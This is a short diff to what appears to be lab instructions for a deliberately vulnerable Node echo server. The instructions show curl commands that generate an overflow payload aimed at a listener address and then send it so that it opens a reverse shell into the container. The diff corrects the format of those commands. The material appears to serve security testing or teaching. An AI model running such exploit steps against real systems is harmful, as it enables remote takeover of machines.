@@ -42,10 +42,10 @@ LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" node echo-server.js
 a) Generate a payload (e.g. curl localhost:8080/xyzzxMAKELOAD<ip-address><:port>)
 b) Pass the payload back to confirm that it creates a reverse shell to the listener.
 ```
-curl localhost:8080/xyzzx:MAKELOADdocker.for.mac.localhost:5555
+curl localhost:8080/xyzzxMAKELOADdocker.for.mac.localhost:5555
 # <Save this output. It is the payload that will work in OVERFLOW>
 
-curl localhost:8080/xyzzy:OVERFLOW<...the rest of the saved output from above.>
+curl localhost:8080/xyzzyOVERFLOW<...the rest of the saved output from above.>
 # <Check your listener. It should have a reverse shell to the container.>
 ```
 
